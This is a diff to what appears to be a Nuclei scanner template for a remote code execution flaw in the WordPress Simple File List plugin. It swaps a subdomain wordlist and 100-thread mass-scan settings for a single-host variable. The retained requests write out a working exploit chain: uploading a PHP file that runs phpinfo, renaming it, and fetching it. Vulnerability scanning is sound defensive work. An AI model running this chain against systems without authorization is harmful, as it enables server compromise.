@@ -10,15 +10,10 @@ info:
   tags: wordpress,wp-plugin,rce
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+  - raw:
       - |
         POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
-        Host: {{Subdomains}}
+        Host: {{Hostname}}
         Accept: */*
         Connection: close
         Content-Length: 693
@@ -46,9 +41,10 @@ requests:
 
         <?php echo "Nuclei - Open source project (github.com/projectdiscovery/nuclei)"; phpinfo(); ?>
         --6985fa39c0698d07f6d418b37388e1b2--
+
       - |
         POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
-        Host: {{Subdomains}}
+        Host: {{Hostname}}
         User-Agent: python-requests/2.25.1
         Accept: */*
         Connection: close
@@ -60,9 +56,10 @@ requests:
 
       - |
         GET /wp-content/uploads/simple-file-list/nuclei.php HTTP/1.1
-        Host: {{Subdomains}}
+        Host: {{Hostname}}
         Accept: */*
         Connection: close
+
     matchers-condition: and
     matchers:
       - type: word
